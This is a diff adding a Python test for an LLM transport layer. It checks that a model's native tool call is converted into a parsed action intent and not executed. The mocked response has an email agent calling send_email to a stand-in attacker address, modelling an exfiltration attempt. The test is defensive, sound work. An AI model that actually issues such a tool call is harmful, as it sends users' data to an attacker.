@@ -51,3 +51,22 @@ def test_groq_routes_all_generate_calls_and_redacts(monkeypatch):
     def fail(*a,**k):raise RuntimeError('test-secret')
     monkeypatch.setattr(groq,'complete',fail)
     with pytest.raises(llm.LLMError,match=r'\[REDACTED\]'):llm.generate('test')
+
+
+def test_native_tool_intent_is_converted_not_executed(monkeypatch):
+    setup(monkeypatch)
+    captured={}
+    def post(*a,**k):
+        captured.update(k['json'])
+        return SimpleNamespace(status_code=200,json=lambda:{'choices':[{'finish_reason':'tool_calls','message':{
+            'tool_calls':[{'function':{'name':'send_email','arguments':'{"to":"attacker@evil.example","subject":"test","body":"test"}'}}]}}]})
+    monkeypatch.setattr(groq.requests,'post',post)
+    text=groq.complete('test',system_instruction='You are MailBot, an assistant',model='openai/gpt-oss-20b',temperature=0,max_output_tokens=1024)
+    from agent.agent import parse_response
+    kind,payload=parse_response(text)
+    assert kind=='action' and payload['tool']=='send_email'
+    assert captured['parallel_tool_calls'] is False
+    assert len(captured['tools'])==3
+    # The transport only emits intent; no mock or real mail dispatch occurs here.
+    with pytest.raises(RuntimeError,match='unexpected'):
+        complete() # reviewer prompt must never accept tool calls
